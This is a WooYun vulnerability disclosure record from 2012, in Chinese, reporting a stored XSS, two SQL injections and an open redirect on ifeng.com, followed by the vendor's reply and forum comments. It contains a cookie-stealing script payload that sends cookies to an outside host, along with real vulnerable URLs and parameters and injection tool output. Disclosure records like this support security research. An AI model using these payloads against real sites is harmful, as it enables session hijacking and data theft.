{"id": 18251, "wybug_id": "wooyun-2012-09167", "wybug_title": "凤凰网存储型XSS+SQL注入", "wybug_corp": "凤凰网", "wybug_author": "an1k3r", "wybug_date": "2012-07-03 11:39", "wybug_open_date": "2012-08-17 11:39", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射", "持久型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-07-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-07-03：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-07-13：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-07-23：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-08-02：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-08-17：\t细节向公众公开  简要描述： 凤凰网1枚存储型XSS，可加载外部任意JS。另外还有2枚SQL注入和1枚URL跳转 详细说明：  1. 1枚存储型XSShttp://app.travel.fashion.ifeng.com/city_comment_614#i_comment在“我来点评”里，嵌入测试代码即可。直接弹Cookie。\n<ScRiPt>alert(document.cookie)</ScRiPt>\n\n\n用来盗取Cookie的代码，字数限制好像没用啊，超过50个字符时只有提示，但代码仍然会插入到数据库里。\n<ScRiPt>document.location = 'http://www.myhost.com/test.php?cookie=' + document.cookie;</ScRiPt>\n2. 2枚SQL注入，只能获取数据库名。漏洞参数在cid和gid。http://app.fashion.ifeng.com/luxury/list.php?type=category&cid=2http://app.fashion.ifeng.com/luxury/list.php?type=country&gid=11\nHost IP: 220.181.35.181Web Server: nginx/1.0.5Keyword Found: AlbertaInjection type is String (')DB Server: MySQL >=5Selected Column Count is 21Injection type is String (')Cannot find string column!Testing for MySQL error based injection methodMySQL error based injection method cant be used!Trying blind methodFinding current data baseLength of 'Current DB' is 11Current DB: app_fashion\n3. 1枚URL跳转没有做过滤，可直接跳转至任意网站。http://bc.ifeng.com/main/c?db=ifeng&bid=11026,10796,2433&cid=1420,61,1&sid=23419&advid=318&camid=2539&show=ignore&url=http://www.wooyun.org   漏洞证明：  都在详细说明里了。   修复方案：  过滤。求礼物啊～   版权声明：转载请注明来源 an1k3r@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2012-07-03 16:48 厂商回复： 非常感谢您提交这些漏洞，由于该注入只能获取当前的数据库名，所以和该跨站并为中等威胁的漏洞，谢谢。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-07-03 11:58 |    \t\t蟋蟀哥哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:57        | 巴蜀人士,80后宅男,自学成才,天朝教育失败...)\t\t \n  凤凰没礼物。。很久没看了    \n     2012-07-03 15:52 |    \t\tan1k3r \t\t\t( 普通白帽子  |\t\t\t        Rank:474 漏洞数:40        | 0.0)\t\t \n  @蟋蟀哥哥 哈哈，当作是刷RANK了    \n     2012-07-03 15:55 |    \t\t蟋蟀哥哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:57        | 巴蜀人士,80后宅男,自学成才,天朝教育失败...)\t\t \n  @an1k3r 人的精力有限啊。肯定是要先看有小礼物的    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}